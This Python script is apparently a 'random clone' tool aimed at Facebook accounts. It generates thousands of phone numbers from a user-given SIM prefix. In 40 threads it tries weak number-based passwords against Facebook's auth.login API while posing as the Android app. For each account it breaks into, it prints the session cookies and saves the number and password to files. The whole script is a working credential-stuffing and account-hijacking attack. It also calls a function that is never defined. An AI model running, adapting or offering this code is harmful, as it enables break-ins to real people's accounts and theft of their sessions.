#OWNER ASIF
#CODING BY ASIF
#MATOHD BY CORI"_"
import os, sys, json, uuid, string, random, requests
from concurrent.futures import ThreadPoolExecutor as tred
def clear():os.system('clear')
oks=[]
cps=[]
loop=0
def ____banner____():
    if "win" in sys.platform:os.system("cls")
    else:os.system("clear")
    print(f"""ASIF""")
def sexyasif():
	____banner____()
	print('[1] RANDOM CLONE')
	print('[0] EXIT')
	select = input("SELECT OPTION : ")
	if select == "1":
		FUCK_XNXXX()

def FUCK_XNXXX():
    user=[]
    clear()
    ____banner____()
    os.system("xdg-open https://t.me/asif_tricker95")
    print(' EXAMPLE SIM CODE : [016] [017] [018] [019]')
    code=input(' ENTER SIM CODE >> ')
    
    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
    try:
        limit=int(input(' ENTER LIMIT >> '))
    except ValueError:
        limit=50000
    clear()
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=40) as fuckas:
        tl=str(len(user))
        ____banner____()
        print('---------------------------------')
        print(' TOTAL ACCOUNT : '+tl)
        print(' YOUR SIM CODE : '+code)
        print(' FAST SPEED CLONING ')
        print(' PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
        print('---------------------------------')
        
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],]
            fuckas.submit(FUCK_FRIEND,ids,passlist)
    
    print(' THE PROGRESS HAS BEEN COMPLETE ')
    print(' TOTAL OK ID '+str(len(oks)))
    print(' TOTAL CP ID '+str(len(cps)))
    input(' PRESS ENTER TO BACK  : ')
    BROKEN_ASIF()
    
#______________RANDDOM METHOD_______________#

def FUCK_FRIEND(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write(f'\r\x1b[[\x1b[₳Ӿ₦_₵Ɽ₳₵₭\x1b[]\x1b[-\x1b[[[{loop}\x1b[]\x1b[1;97m-\x1b[\x1b[mOK-{len(oks)}\x1b[]')
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            header={'User-Agent': 'Mozilla/5.0 (Linux; Android 5.1.1; i-mobile IQ Z PRO Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.18.107;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
            url='https://graph.facebook.com/method/auth.login'
            reqx=requests.post(url,data=datax,headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                if str(uid) in oks:
                    break
                else:
                    print('\r\r \033[1;32m[BRONEN-ACTIVE] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[3;34m [COOKIE_❇️] '+coki)
                    open('/sdcard/BRONEN-ACTIVE.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;35m[BRONEN-INCTIVE] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/BRONEN-INCTIVE.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
sexyasif()